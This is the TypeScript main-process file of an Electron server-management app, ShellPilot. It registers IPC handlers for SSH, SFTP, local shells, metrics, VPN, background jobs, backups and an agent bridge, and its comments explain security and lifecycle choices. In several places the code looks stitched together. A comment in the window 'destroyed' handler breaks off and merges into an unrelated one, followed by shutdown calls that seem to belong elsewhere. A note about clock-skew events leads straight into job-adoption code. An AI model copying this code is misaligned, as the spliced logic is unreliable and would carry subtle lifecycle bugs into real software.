// Must come first: redirects userData for portable builds before any
// service module resolves its file paths.
import './portable'
import { app, shell, BrowserWindow, ipcMain, nativeTheme, dialog, session, Menu, Notification, powerMonitor } from 'electron'
import { join } from 'node:path'
import { readFileSync, existsSync, writeFileSync, renameSync } from 'node:fs'
import { readFile, writeFile } from 'node:fs/promises'
import { randomUUID } from 'node:crypto'
import {
  sshConnect,
  sshWrite,
  sshResize,
  sshClose,
  sshDisposeAll,
  setSshPrompter,
  setPoolIdle,
  poolList,
  poolClose,
  sshExec,
  sshExecStream,
  sshOpenFresh
} from './services/ssh'
import type { KeyboardRequest } from './services/ssh'
import {
  localConnect,
  localWrite,
  localAck,
  localResize,
  localClose,
  localDisposeAll,
  localDisposeForWebContents
} from './services/localPty'
import { listShells } from './services/shellDiscovery'
import {
  isLocalTerminalEnabled,
  isValidSessionId,
  parseLocalConnect,
  syncLocalTerminalEnabled
} from './services/localGate'
import {
  sftpConnect,
  sftpList,
  sftpRead,
  sftpWrite,
  sftpMkdir,
  sftpRename,
  sftpDelete,
  sftpUpload,
  sftpDisconnect,
  sftpDisposeAll
} from './services/sftp'
import { metricsSample, metricsDisconnect, metricsDisposeAll } from './services/metrics'
import { HostFactsReader } from './services/hostFacts'
import { FleetSampler, fleetCached, setActiveFleetSampler } from './services/fleetSampler'
import {
  RETENTION_FULL_DAYS,
  RETENTION_HOURLY_DAYS,
  loadHistory,
  type EventCursor,
  type HistoryStore
} from './services/history'
import {
  CAPACITY_THRESHOLDS,
  buildCapacityReport,
  type CapacityReport
} from '../shared/capacity'
import { BroadcastRunner } from './services/broadcast'
import { JobRunner, type JobStore } from './services/jobRunner'
import { attachedJobExecutor } from './services/jobExec'
import { detachedJobExecutor } from './services/jobDetached'
import { AccessCommitter, AccessReader } from './services/access'
import { PostureReader } from './services/posture'
import { readChangeLog } from './services/changelog'
import type { ChangeLogFilter, ChangeLogPage } from '../shared/changelog'
import type {
  AccessChangePreview,
  AccessChangeTarget,
  AccessCommitReport,
  AccessRefusal,
  AccessRunRequest,
  AccessRunResult,
  AccessStagingFailure
} from '../shared/access'
import {
  ACCESS_ROLLBACK_SECONDS,
  ACCESS_WRITE_DISABLED_REASON,
  ACCESS_WRITE_ENABLED,
  planAccessChange
} from '../shared/access'
import type { JobHostCapabilityReport, JobRunRequest } from '../shared/jobs'
import { JOB_DETACHED_STALL_GRACE_MS, jobCohorts, restartsTheMachine } from '../shared/jobs'
import type { GateHost } from '../shared/patch'
import {
  buildTopology,
  rebootBlockFor,
  sameWaveDatabaseBlocks,
  unmatchedHopNote,
  type RebootBlock
} from '../shared/topology'
import { LogTailer } from './services/logTail'
import type { LogLine, LogSource, LogTailState } from '../shared/logtail'
import { CRON_COLLECT_COMMAND, parseCronCollection, type CronEntry, type CronSourceReport } from '../shared/cron'
import { DockerReader } from './services/docker'
import { ComposeReader } from './services/compose'
import { buildDockerLogsCommand } from '../shared/docker'
import type { DockerAction, DockerLogsOptions } from '../shared/docker'
import type { ComposeImageWriteRequest, ComposeProjectRef } from '../shared/compose'

// The one refusal worth retrying as root. Deliberately narrow: a container that
// simply has no logs, or a dead daemon, is not something root fixes.
const DOCKER_SOCKET_REFUSED = /permission denied while trying to connect|got permission denied.*docker/i
import { KubernetesReader } from './services/kubernetes'
import { buildK8sLogsCommand } from '../shared/kubernetes'
import type { K8sRolloutTarget } from '../shared/kubernetes'
import type { BroadcastProgress, BroadcastRequest } from '../shared/broadcast'
import { planBroadcast, verifyApproval } from '../shared/broadcast'
import type { FleetSamplerConfig } from '../shared/fleet'
import {
  webhookConfigure,
  webhookStatus,
  webhookDeliveryStatus,
  webhookSetUrl,
  webhookTest,
  webhookNotify
} from './services/webhookAlerts'
import type { AlertPayload, StoredAlertRow, StoredDbAlertRow } from '../shared/webhook'
import { ALERT_HISTORY_KIND, DB_ALERT_HISTORY_KINDS, sanitiseStoredAlert } from '../shared/webhook'
import { dbTest, dbQuery, dbInfo, dbClose, dbDisposeAll } from './services/db'
import { dbShell } from './services/dbshell'
import { dbOps } from './services/dbOps'
import type { DbConnectConfig } from '../shared/db'
import { notableDbEvents } from '../shared/dbOps'
import { setSecret, getSecret, deleteSecret, secretsAvailable } from './services/secrets'
import {
  vaultStatus,
  vaultCreate,
  vaultUnlock,
  vaultLock,
  vaultList,
  vaultSave,
  vaultChangePassword,
  vaultDestroy,
  vaultDispose
} from './services/vault'
import type { VaultEntry } from '../shared/vault'
import { wsLockIds, wsLockSet, wsLockVerify, wsLockRemove, wsLockDelete } from './services/wslock'
import { tunnelStart, tunnelStop, tunnelList, tunnelDisposeAll } from './services/tunnel'
import type { TunnelConfig, TunnelSshConfig } from '../shared/tunnel'
import { knownHostList, knownHostForget } from './services/knownhosts'
import {
  setVpnPrompter,
  vpnAttachRenderer,
  vpnDependentsOf,
  vpnDetachRenderer,
  vpnDisposeAll,
  vpnInit,
  vpnList,
  vpnLogs,
  vpnProbe,
  vpnProfiles,
  vpnReload,
  vpnSetCadence,
  vpnStart,
  vpnStop,
  vpnSubscribeLogs,
  vpnUnsubscribeLogs,
  vpnValidate,
  vpnHandleWake
} from './services/vpn/manager'
import { vpnCommitImport, vpnDeleteSecrets, vpnImport } from './services/vpn/import'
import { wireguardDriver } from './services/vpn/drivers/wireguard'
import { mintKeypair, storeKeypair } from './services/vpn/keys'
import { toVpnResult } from './services/vpn/errors'
import { withVpnTransport, withVpnTransportDb } from './services/vpn/transport'
import type { VpnKeygenResult, VpnKind, VpnMintResult, VpnPublicKeyResult, VpnSpec } from '../shared/vpn'
import { externalEditOpen, externalEditStop, externalEditDisposeAll } from './services/extedit'
import {
  backupExport,
  backupImport,
  backupInspect,
  deleteAllData,
  discardStagedBackup,
  dumpToDestination,
  inspectRemoteBackup,
  listRemoteBackups,
  readTargets,
  recordRun,
  relaunchApp,
  runBackupToDestination,
  saveDestinations,
  startBackupSchedule,
  stopBackupSchedule
} from './services/backup'
import { databaseDumpTarget, dumpableDatabases } from './services/backupTargets'
import { BACKUP_STAGE_LABEL } from '../shared/backup'
import type { BackupDestination, DumpRunReport } from '../shared/backup'
import {
  checkForUpdates,
  getUpdaterStatus,
  onUpdaterStatus,
  installUpdate,
  openReleasePage,
  getCapabilities as getUpdaterCapabilities,
  getPrefs as getUpdaterPrefs,
  setPrefs as setUpdaterPrefs,
  downloadUpdate,
  startAutoCheck
} from './services/updater'
import type { UpdatePrefs } from '../shared/updater'
import { parseSshConfig } from '../shared/sshconfig'
import { RuleEngine } from './services/rules'
import type { RuleEventStore, RulesFile } from './services/rules'
import { RULES_FILE } from '../shared/rules'
import type { RuleDraftWire } from '../shared/rules'
import { loadData, saveData } from './services/store'
import type { SshConnectConfig } from '../shared/ssh'
import { resolveDbSecrets, resolveChainSecrets, type SecretBlob } from './services/credentialResolver'
import {
  refreshMcpDataCache,
  listCachedWorkspaces,
  listCachedServers,
  listCachedDatabases,
  getCachedServer,
  serverToSshConfig
} from './services/mcpDataCache'
import {
  listGroups,
  createGroup,
  saveGroup,
  deleteGroup,
  listAssignments,
  setAssignment,
  removeAssignment,
  listServerMeta,
  setServerAliases
} from './services/policyStore'
import type { AccessGroup, ApprovalRequest, McpGlobalConfig, PolicyAssignment } from '../shared/mcp'
import {
  getMcpConfig,
  setMcpConfig,
  createSession,
  listSessions,
  revokeSession,
  deleteSession,
  killAllSessions,
  setSessionGroup,
  type CreateSessionInput
} from './services/mcpAuth'
import { listPendingApprovals, respondToApproval, onApprovalEvent, denyAllPending } from './services/approvals'
import { onCliPairingEvent, cancelCliPairing } from './services/cliPairing'
import { claudeCodeCommand, writeClaudeDesktopConfig, writeCodexConfig } from './services/clientConfig'
import { setAgentServerCreator, type AgentServerRequest, type AgentServerResult } from './services/agentServerCreate'
import { listDefaultKeys, sshDir } from './services/sshKeys'
import { setVaultAutoLock } from './services/vault'
import {
  biometricSupport,
  biometricEnabled,
  biometricScope,
  enableBiometricUnlock,
  disableBiometricUnlock,
  forgetSessionKey,
  biometricUnlock
} from './services/biometrics'
import { listAudit } from './services/auditLog'
import { recordJobApproval } from './services/approvalLog'
import { startMcpServer, stopMcpServer, mcpServerStatus, explainSessionAccess } from './services/mcpServer'

const isDev = !app.isPackaged

// Windows shows the AppUserModelID as the heading on every notification, and
// Electron's default is "electron.app.<name>". Setting it to the installer's
// appId makes Windows resolve it to the Start-menu shortcut, so notifications
// are headed "ShellPilot". Must be set before any notification is shown.
if (process.platform === 'win32') app.setAppUserModelId('com.shellpilot.app')

let mainWindow: BrowserWindow | null = null

// WSL has a broken GPU + sandbox/zygote stack: the GPU and network service
// crash on launch, which leaves the window black because the renderer can
// never paint (or, in dev, load the Vite server). Detect WSL and fall back to
// software rendering with the sandbox disabled. On real Linux the sandbox and
// hardware acceleration stay on.
function isWSL(): boolean {
  if (process.platform !== 'linux') return false
  if (process.env.WSL_DISTRO_NAME || process.env.WSL_INTEROP) return true
  try {
    return /microsoft/i.test(readFileSync('/proc/version', 'utf8'))
  } catch {
    return false
  }
}

if (isWSL()) {
  app.disableHardwareAcceleration()
  app.commandLine.appendSwitch('no-sandbox')
  app.commandLine.appendSwitch('disable-gpu')
  app.commandLine.appendSwitch('disable-dev-shm-usage')
}

// Content-Security-Policy applied via response headers.
// Dev needs inline/eval for the Vite dev server + React fast-refresh; prod is strict.
function installCsp(): void {
  const policy = isDev
    ? "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: http://localhost:* http://127.0.0.1:*"
    : "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'"
  session.defaultSession.webRequest.onHeadersReceived((details, cb) => {
    cb({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [policy]
      }
    })
  })
}

// Taskbar/window icon. Packaged builds also get platform icons from build/
// via electron-builder; this covers dev and the Linux window manager.
function appIcon(): string | undefined {
  const p = join(__dirname, '../../resources/icon.png')
  return existsSync(p) ? p : undefined
}

function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 1440,
    height: 900,
    minWidth: 1024,
    minHeight: 640,
    show: false,
    backgroundColor: '#0d1017',
    icon: appIcon(),
    titleBarStyle: process.platform === 'darwin' ? 'hiddenInset' : 'hidden',
    frame: process.platform === 'darwin',
    trafficLightPosition: { x: 16, y: 16 },
    webPreferences: {
      preload: join(__dirname, '../preload/index.mjs'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false
    }
  })

  mainWindow.on('ready-to-show', () => mainWindow?.show())

  // F5 would reload and destroy every open terminal. Ctrl+R is deliberately
  // NOT blocked here: preventDefault stops the key reaching the page at all,
  // and the shell needs it for reverse history search. Removing the reload
  // role from the menu is what stops Ctrl+R reloading.
  mainWindow.webContents.on('before-input-event', (event, input) => {
    if (input.type === 'keyDown' && input.key === 'F5') event.preventDefault()
  })

  if (isDev) {
    mainWindow.webContents.on('console-message', (_e, level, message, line, source) => {
      console.log(`[renderer:${level}] ${message} (${source}:${line})`)
    })
    mainWindow.webContents.on('render-process-gone', (_e, d) =>
      console.log('[renderer gone]', d.reason)
    )
    mainWindow.webContents.on('did-fail-load', (_e, code, desc) =>
      console.log('[did-fail-load]', code, desc)
    )
  }

  mainWindow.webContents.setWindowOpenHandler((details) => {
    shell.openExternal(details.url)
    return { action: 'deny' }
  })

  // Emit maximize state so the renderer titlebar can update its control.
  const emitMax = () => mainWindow?.webContents.send('window:maximized', mainWindow.isMaximized())
  mainWindow.on('maximize', emitMax)
  mainWindow.on('unmaximize', emitMax)

  // VPN status is polled, and nobody reads a byte counter on a window they
  // cannot see. Backing off while hidden is most of the idle cost of this
  // feature; resuming on focus samples immediately so the numbers are current
  // by the time the user has looked at them.
  const active = (): void => vpnSetCadence('active')
  const idle = (): void => vpnSetCadence('idle')
  mainWindow.on('focus', active)
  mainWindow.on('show', active)
  mainWindow.on('blur', idle)
  mainWindow.on('hide', idle)
  vpnAttachRenderer(mainWindow.webContents)
  mainWindow.on('closed', () => {
    // The WebContents is already gone here, so the bus would prune it on its
    // next send anyway; doing it now keeps a closed window from being counted
    // as a live target in the meantime.
    vpnSetCadence('idle')
  })
  const wcId = mainWindow.webContents.id
  mainWindow.webContents.on('destroyed', () => {
    if (mainWindow) vpnDetachRenderer(mainWindow.webContents)
    // Reap this window's shells. Without it they keep running until quit,
    // holding a WebContents that send() refuses to write to — live processes
    // with nowhere left to report. The id is captured above because the
    // WebContents is already gone by the time this fires.
    localDisposeForWebContents(wcId)

    // Same reasoning, and it has to be HERE rather than only in `before-quit`.
    // On macOS `window-all-closed` deliberately does not quit, so closing the
    // window fires neither handler: every `journalctl -f` kept running on every
    // selected host, holding a pooled SSH channel, until the user quit the app
    // — exactly the leak the disposal was added to prevent. A broadcast likewise
    // kept working through its queue for a window that no longer existed, and on
    // `activate` a new window would receive events carrying tailIds it filters
    // out, so the streams were invisible and unstoppable.
    // Nothing half-written at the far end: a tick that has not started must not
  // start now, and one already running holds the process through its own
  // promise rather than through this timer.
  stopBackupSchedule()

  logTailer.disposeAll()
    broadcast.disposeAll()
    // Same, and it matters more here: a job outlives its panel by design, so a
    // window closing is exactly the case where one would keep working through
    // its queue with nowhere to report. Queued hosts must not start.
    jobRunner.disposeAll()
  // Stop sweeping. A sweep that started is allowed to finish its own promise;
  // what this prevents is a new one beginning against a store that is about to
  // close.
  ruleEngine.stop()
  })

  if (isDev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

// ---- Narrow, validated IPC surface -----------------------------------------

ipcMain.handle('window:control', (_e, action: unknown) => {
  if (!mainWindow) return
  switch (action) {
    case 'minimize':
      mainWindow.minimize()
      break
    case 'toggle-maximize':
      if (mainWindow.isMaximized()) mainWindow.unmaximize()
      else mainWindow.maximize()
      break
    case 'close':
      mainWindow.close()
      break
    default:
      // ignore unknown actions
      break
  }
})

ipcMain.handle('window:isMaximized', () => mainWindow?.isMaximized() ?? false)

ipcMain.handle('app:platform', () => process.platform)
ipcMain.handle('app:version', () => app.getVersion())

ipcMain.handle('theme:set', (_e, mode: unknown) => {
  if (mode === 'dark' || mode === 'light' || mode === 'system') {
    nativeTheme.themeSource = mode
  }
  return nativeTheme.shouldUseDarkColors
})

ipcMain.handle('ssh:defaultKeys', () => listDefaultKeys())

ipcMain.handle('dialog:openKey', async () => {
  if (!mainWindow) return null
  const result = await dialog.showOpenDialog(mainWindow, {
    title: 'Select private key',
    // ~/.ssh is where keys actually live and the picker will not show a hidden
    // folder unless it opens there, so landing anywhere else means the user
    // has to type the path they came here to avoid typing.
    defaultPath: sshDir(),
    properties: ['openFile', 'showHiddenFiles'],
    // All files first: OpenSSH keys usually have no extension at all
    // (id_ed25519, or any bare filename), and an extension filter hides them.
    filters: [
      { name: 'All files', extensions: ['*'] },
      { name: 'Private keys', extensions: ['pem', 'key', 'ppk'] }
    ]
  })
  return result.canceled ? null : result.filePaths[0] ?? null
})

// Save/open a small JSON document the renderer owns (keyboard shortcuts
// today). The renderer serialises it — main only picks the path and moves the
// bytes, so it needs no knowledge of the shape.
ipcMain.handle('dialog:saveJson', async (_e, suggestedName: string, contents: string) => {
  if (!mainWindow) return false
  const chosen = await dialog.showSaveDialog(mainWindow, {
    title: 'Export',
    defaultPath: suggestedName,
    filters: [{ name: 'JSON', extensions: ['json'] }]
  })
  if (chosen.canceled || !chosen.filePath) return false
  await writeFile(chosen.filePath, contents, 'utf8')
  return true
})

ipcMain.handle('dialog:openJson', async () => {
  if (!mainWindow) return null
  const chosen = await dialog.showOpenDialog(mainWindow, {
    title: 'Import',
    properties: ['openFile'],
    filters: [{ name: 'JSON', extensions: ['json'] }]
  })
  const path = chosen.canceled ? null : chosen.filePaths[0] ?? null
  if (!path) return null
  // A file the user picked by hand can be anything; the renderer validates the
  // contents, so a read failure is the only thing handled here.
  try {
    return await readFile(path, 'utf8')
  } catch {
    return null
  }
})

ipcMain.handle('dialog:openUpload', async () => {
  if (!mainWindow) return null
  const result = await dialog.showOpenDialog(mainWindow, {
    title: 'Select files to upload',
    buttonLabel: 'Upload',
    properties: ['openFile', 'multiSelections', 'showHiddenFiles']
  })
  return result.canceled ? null : result.filePaths
})

// ---- SSH ----

// Multi-factor challenges are answered by the user, so the request is relayed
// to the renderer and the reply awaited here.
let promptSeq = 0
const pendingPrompts = new Map<string, (answers: string[]) => void>()

ipcMain.on(
  'ssh:prompt-reply',
  (_e, id: string, answers: string[], remember?: boolean, serverId?: string) => {
    const resolve = pendingPrompts.get(id)
    if (!resolve) return
    pendingPrompts.delete(id)
    // Only a single answer is worth storing; multi-prompt challenges are
    // per-attempt by nature.
    if (remember && serverId && answers.length === 1) {
      const raw = getSecret(serverId)
      const blob: SecretBlob = raw ? (JSON.parse(raw) as SecretBlob) : {}
      blob.kbAnswer = answers[0]
      setSecret(serverId, JSON.stringify(blob))
    }
    resolve(answers)
  }
)

setSshPrompter((req: KeyboardRequest) => {
  // A previously saved answer skips the dialog entirely.
  if (req.serverId && req.prompts.length === 1) {
    const raw = getSecret(req.serverId)
    if (raw) {
      try {
        const blob = JSON.parse(raw) as SecretBlob
        if (blob.kbAnswer) return Promise.resolve([blob.kbAnswer])
      } catch {
        /* fall through to prompting */
      }
    }
  }
  const target = mainWindow
  if (!target || target.isDestroyed()) return Promise.resolve([])
  const id = `kb-${promptSeq++}`
  return new Promise<string[]>((resolve) => {
    pendingPrompts.set(id, resolve)
    target.webContents.send('ssh:prompt', { id, ...req })
    // Never leave a connection hanging on an unanswered dialog.
    setTimeout(() => {
      if (pendingPrompts.delete(id)) resolve([])
    }, 120000)
  })
})


ipcMain.handle('ssh:connect', (e, cfg: SshConnectConfig & { serverId?: string }) =>
  sshConnect(e.sender, withVpnTransport(resolveChainSecrets(cfg)))
)
ipcMain.handle('ssh:pool-list', () => poolList())
ipcMain.handle('ssh:pool-close', (_e, key: string) => poolClose(key))
ipcMain.handle('ssh:pool-idle', (_e, minutes: number) => setPoolIdle(minutes))
ipcMain.on('ssh:write', (_e, id: string, data: string) => sshWrite(id, data))
ipcMain.on('ssh:resize', (_e, id: string, cols: number, rows: number) => sshResize(id, cols, rows))
ipcMain.on('ssh:close', (_e, id: string) => sshClose(id))

// ---- Local terminal ----
//
// A shell on this machine, with this user's privileges. Deliberately NOT
// reachable from the MCP bridge or the CLI: there is no capability for it, no
// ASK path and no tool, because an agent that can run local commands can read
// the vault file, the policy store and the audit log that are supposed to
// constrain it. tests/localTerminalNotExposed.test.ts is what keeps that true.
//
// Every handler checks isLocalTerminalEnabled() in main rather than trusting the
// renderer's own toggle, and every session is bound to the WebContents that
// opened it, so one window cannot drive another's shell by guessing an id.
ipcMain.handle('local:shells', (_e, refresh?: unknown) => {
  if (!isLocalTerminalEnabled()) return []
  return listShells(refresh === true)
})

ipcMain.handle('local:connect', (e, raw: unknown) => {
  if (!isLocalTerminalEnabled()) return
  const parsed = parseLocalConnect(raw)
  if (!parsed.ok) {
    // Report through the same status channel a spawn failure would use, so the
    // renderer has one error path rather than two.
    const id = (raw as { sessionId?: unknown })?.sessionId
    if (isValidSessionId(id) && !e.sender.isDestroyed()) {
      e.sender.send(`local:status:${id}`, {
        sessionId: id,
        phase: 'error',
        message: parsed.reason
      })
    }
    return
  }
  return localConnect(e.sender, parsed.cfg)
})

ipcMain.on('local:write', (e, id: unknown, data: unknown) => {
  if (!isLocalTerminalEnabled()) return
  if (!isValidSessionId(id) || typeof data !== 'string') return
  localWrite(e.sender.id, id, data)
})
ipcMain.on('local:ack', (e, id: unknown, units: unknown) => {
  if (!isValidSessionId(id) || typeof units !== 'number') return
  localAck(e.sender.id, id, units)
})
ipcMain.on('local:resize', (e, id: unknown, cols: unknown, rows: unknown) => {
  if (!isValidSessionId(id) || typeof cols !== 'number' || typeof rows !== 'number') return
  localResize(e.sender.id, id, cols, rows)
})
// Close is never gated on the flag: turning the feature off must still let the
// renderer tear down sessions it already has.
ipcMain.on('local:close', (e, id: unknown) => {
  if (!isValidSessionId(id)) return
  localClose(id, e.sender.id)
})

// ---- SFTP ----
ipcMain.handle('sftp:connect', (_e, key: string, cfg: SshConnectConfig & { serverId?: string }) =>
  sftpConnect(key, withVpnTransport(resolveChainSecrets(cfg)))
)
ipcMain.handle('sftp:list', (_e, key: string, path: string) => sftpList(key, path))
ipcMain.handle('sftp:read', (_e, key: string, path: string) => sftpRead(key, path))
ipcMain.handle('sftp:write', (_e, key: string, path: string, content: string) =>
  sftpWrite(key, path, content)
)
ipcMain.handle('sftp:mkdir', (_e, key: string, path: string) => sftpMkdir(key, path))
ipcMain.handle('sftp:rename', (_e, key: string, from: string, to: string) => sftpRename(key, from, to))
ipcMain.handle('sftp:delete', (_e, key: string, path: string, dir: boolean) => sftpDelete(key, path, dir))
ipcMain.handle('sftp:upload', (e, key: string, localPaths: string[], remoteDir: string) =>
  sftpUpload(e.sender, key, localPaths, remoteDir)
)
ipcMain.handle('sftp:disconnect', (_e, key: string) => sftpDisconnect(key))
ipcMain.handle('sftp:edit-external', (e, key: string, path: string, command: string) =>
  externalEditOpen(e.sender, key, path, command)
)
ipcMain.handle('sftp:edit-external-stop', (_e, path: string) => externalEditStop(path))

// ---- Metrics ----
ipcMain.handle('metrics:sample', (_e, key: string, cfg: SshConnectConfig & { serverId?: string }) =>
  metricsSample(key, resolveChainSecrets(cfg))
)
ipcMain.handle('metrics:disconnect', (_e, key: string) => metricsDisconnect(key))

// ---- The durable store ----
//
// Roadmap item A. Opened lazily and off the startup path: loadHistory() never
// throws, and a machine where it will not open gets `null` and an app that
// behaves exactly as it did before this existed. Nothing here is awaited,
// because nothing about launching depends on it.
//
// The retention pass is armed here rather than inside the store, so the schedule
// is visible next to everything else main owns. It runs once shortly after open
// and then every six hours: full resolution for a week, hourly means for a
// quarter, then dropped. Measured at ~20 MB steady state versus 730 MB a year
// unmanaged — and about twice that on disk, because a full .bak is taken at
// every clean launch. A tool that alerts on disk pressure must not cause it.
let historyStore: HistoryStore | null = null
let historyRetain: ReturnType<typeof setInterval> | null = null
const HISTORY_RETAIN_INTERVAL_MS = 6 * 60 * 60 * 1000
/** How long 'before-quit' waits for an in-flight sweep to finish writing before
 *  closing the store anyway. Inside the 4s teardown cap, with room to spare. */
const HISTORY_LAST_SWEEP_MS = 1500

// Called from app.whenReady(), NOT at module scope.
//
// Module evaluation is synchronous, so the single-instance decision below is
// made first either way — but loadHistory() awaits an import, so the open, the
// integrity_check, the pragmas, the schema and the backup all happen in a later
// turn, racing app.quit() on the instance that lost the lock. That second
// process would open the same file and its backup call would overwrite the
// RUNNING instance's .bak with a copy taken from a concurrently-written
// database, then die without ever closing. A truncated .bak silently downgrades
// the primary's recovery ladder from "restore from backup" to "start empty".
// Only the winning instance reaches whenReady, so only it opens the store.
function startHistory(): void {
  void loadHistory().then((store) => {
    historyStore = store
    if (!store) return
    console.log(
      `[history] open at ${store.path} (journal=${store.journalMode}, sqlite=${store.sqliteVersion}` +
        `${store.recovery === 'none' ? '' : `, recovery=${store.recovery}`})`
    )
    // Recorded in the store as well as logged. `recovery` is the answer to
    // "why does this fleet have no past", and a console line in a packaged app
    // is not somewhere a user can look — an event survives to be shown.
    if (store.recovery !== 'none') {
      store.recordEvent('history-recovery', null, { recovery: store.recovery })
    }
    // Only the CHANGE is recorded, not every refusal. A machine whose clock is
    // permanently wrong runs this four times a day forever, and a store that
    // refuses to age out is not helped by an event every six hours saying so.
    // Adopt before the first job can be started, and before the retention pass
    // below could delete what we are about to read. Every job whose rows say it
    // was running belongs to a process that is gone: on the attached path its
    // channel died with that process, so the honest close is `abandoned` and
    // the row says what the SIGHUP may have left behind. Doing this at open —
    // rather than lazily, when someone happens to look at the job list — is
    // what makes a stale `running` row impossible to observe.
    try {
      const adopted = jobRunner.adopt()
      if (adopted.length > 0) {
        console.log(`[jobs] closed ${adopted.length} job(s) abandoned when ShellPilot last stopped`)
      }
      // Then the ones that are STILL RUNNING. adopt() deliberately leaves any
      // job with a detached marker open, because there is a command in its own
      // session on that host right now and the marker directory records where —
      // so this picks it up from the rows alone, resumes reading its output
      // from the byte it had got to, and finishes it. That is the whole of what
      // B2 claims over B1.
      //
      // The server address comes from the same cache the MCP bridge resolves
      // names through, which main primes at launch from the persisted data
      // file. Reading a host's address is not a capability and this is not the
      // direction the agent boundary guards: nothing agent-reachable can reach
      // the job engine, and that is unchanged. The CONFIG IS NOT STORED WITH
      // THE JOB, deliberately — it can carry an inline credential, and the job
      // store is a year-long record.
      // B3: reclaim re-derives the approval model over the stored spec and
      // target list before it resumes anything, and refuses to START a host
      // this process never saw a human authorise. It still FINISHES the hosts
      // already running — the command is on that machine either way, and
      // refusing to read its exit status would discard the record while
      // leaving the risk.
      const reclaimed = jobRunner.reclaim({
        cfgFor: (serverId) => {
          const server = getCachedServer(serverId)
          return server ? serverToSshConfig(server) : null
        }
      })
      if (reclaimed.length > 0) {
        console.log(`[jobs] resumed ${reclaimed.length} detached job(s) still running on their hosts`)
      }
    } catch (err) {
      console.error('[jobs] adoption failed:', err)
    }

    let lastSkip: string | null = null
    let lastJobSkip: string | null = null
    const pass = (): void => {
      try {
        // Job output on its own, much shorter horizon: it cannot be
        // downsampled the way a metric series can — there is no hourly mean of
        // a dpkg log — so the only honest choices are keep it or drop it. The
        // job and target rows behind it live twelve times longer, because they
        // are tiny and they are what a change log reads.
        try {
          const jobs = historyStore?.jobRetain()
          if (jobs && (jobs.outputDropped > 0 || jobs.jobsDropped > 0)) {
            console.log(
              `[jobs] retention dropped ${jobs.outputDropped} output row(s) and ${jobs.jobsDropped} job(s)`
            )
          }
          // Recorded, not only logged, for retain()'s reason: a store that
          // quietly stopped ageing out its change log is visible in the store
          // rather than in a console nobody kept. Written under a different
          // kind from retain()'s so the two skips are tellable apart — they
          // have different causes and different costs.
          const jobSkip = jobs?.skipped ?? null
          if (jobSkip !== null && jobSkip !== lastJobSkip) {
            historyStore?.recordEvent('job-retention-skipped', null, { reason: jobSkip })
          }
          lastJobSkip = jobSkip
        } catch (err) {
          console.error('[jobs] retention pass failed:', err)
        }
        const result = historyStore?.retain()
        const skipped = result?.skipped ?? null
        if (skipped !== null && skipped !== lastSkip) {
          // retain() has already said why on the console. Recording it means a
          // store that quietly stopped ageing out is visible in the store
          // itself rather than only in a log nobody kept.
          historyStore?.recordEvent('retention-skipped', null, { reason: skipped })
        }
        lastSkip = skipped
      } catch (err) {
        console.error('[history] retention pass failed:', err)
      }
    }
    pass()
    historyRetain = setInterval(pass, HISTORY_RETAIN_INTERVAL_MS)
    // Never let the retention timer be the reason the process stays alive.
    historyRetain.unref?.()
  })
}

/**
 * The job runner's view of the store.
 *
 * Resolved per call, not captured, for exactly the reason the fleet sampler's
 * `history` accessor is: the runner is constructed at module scope and the
 * store opens asynchronously after it — and on a machine where history is off
 * it never opens at all. A captured null would make jobs permanently
 * unavailable on every machine, including the ones where the store opened two
 * seconds later.
 *
 * The writes are no-ops without a store rather than throws. `jobs:run` refuses
 * up front with a sentence that says why, so nothing gets as far as here
 * believing it is being recorded; what these guards cover is the store closing
 * underneath a job that is already running, which is a shutdown, not an error.
 */
const jobStore: JobStore = {
  createJob: (job) => historyStore?.createJob(job),
  updateJob: (id, patch) => historyStore?.updateJob(id, patch),
  updateJobTarget: (id, serverId, patch) => historyStore?.updateJobTarget(id, serverId, patch),
  appendJobOutput: (id, serverId, lines) => historyStore?.appendJobOutput(id, serverId, lines),
  listJobs: (limit) => historyStore?.listJobs(limit) ?? [],
  readJob: (id) => historyStore?.readJob(id) ?? null,
  readJobOutput: (id, serverId) => historyStore?.readJobOutput(id, serverId) ?? [],
  unfinishedJobs: () => historyStore?.unfinishedJobs() ?? [],
  recordEvent: (kind, hostId, payload, at) => historyStore?.recordEvent(kind, hostId, payload, at)
}

/** Close the store and stop its timer, for the paths that do not go through
 *  'before-quit' — deleteAllData and backupImport both delete the database out
 *  from under this process, and relaunchApp()'s app.exit(0) emits no
 *  'before-quit' at all. */
function closeHistoryNow(): void {
  if (historyRetain) {
    clearInterval(historyRetain)
    historyRetain = null
  }
  historyStore?.close()
  historyStore = null
}

// ---- Fleet sampling ----
//
// Runs in main so the estate is sampled whether or not the monitor is on
// screen. Previously every sample came from a mounted ServerMonitorCard, so
// leaving that tab stopped sampling entirely and nothing could notice a
// failure while the user was doing something else.
//
// The renderer supplies targets because it owns the server list and the
// workspace scoping; main owns the schedule and the credentials.
// Host facts, on the sampler's slow clock. One reader for the whole process:
// it holds no state of its own, only the exec function, and every probe is a
// single round trip that releases its pooled connection when it finishes.
//
// It does NOT go through metrics.ts's exec, which discards the exit code —
// three of the probes inside the collector use exit status as their API.
const hostFactsReader = new HostFactsReader({
  exec: (cfg, command, timeoutMs) =>
    sshExec(cfg as Parameters<typeof sshExec>[0], command, timeoutMs, false)
})

// Whether the key and access probe may run — roadmap item 23.
//
// Main is not given the renderer's settings, so this does what the local
// terminal's kill switch already does a few hundred lines below: keeps its own
// copy, refreshed from the same blob on every `data:save` and read once at
// boot. Absent reads as OFF, matching `moduleEnabled` in shared/modules.ts, so
// an upgrade never switches it on for an existing install.
//
// Gating the CHANNEL rather than the panel is the point — see the note on
// FleetSamplerDeps.accessEnabled for why this probe is the exception.
let accessModuleOn = false
// Whether the security posture probe may run — roadmap item 24. Kept beside
// the access flag and refreshed from the same blob, and gated for a DIFFERENT
// reason: the access probe is gated because of what it does on the host, this
// one because of what it produces. A fleet-wide table of which host has no
// firewall and still takes passwords over ssh is a map of how to attack the
// estate, and assembling one is a thing a person switches on rather than
// discovers. See FleetSamplerDeps.postureEnabled.
let postureModuleOn = false
